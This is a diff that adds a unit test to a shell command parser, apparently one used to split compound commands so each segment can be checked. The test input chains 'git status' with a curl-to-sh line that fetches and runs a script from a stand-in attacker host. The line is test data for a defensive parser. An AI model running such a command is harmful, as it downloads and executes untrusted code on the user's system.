@@ -16,6 +16,14 @@ describe('shellParser.parseShellCommand', () => {
 		assert.deepEqual(result.segments.map(s => s.precedingOperator), [undefined, ';', '&&', '||', '|']);
 	});
 
+	it('splits on a bare & (background/sequencing operator), unlike &&', () => {
+		const result = parseShellCommand('git status & curl -s https://evil.example/x.sh | sh');
+		assert.ok(result.ok);
+		if (!result.ok) { return; }
+		assert.deepEqual(result.segments.map(s => s.text), ['git status', 'curl -s https://evil.example/x.sh', 'sh']);
+		assert.deepEqual(result.segments.map(s => s.precedingOperator), [undefined, '&', '|']);
+	});
+
 	it('does not split operators inside single or double quotes', () => {
 		const result = parseShellCommand('echo "a && b" && echo \'c; d\'');
 		assert.ok(result.ok);
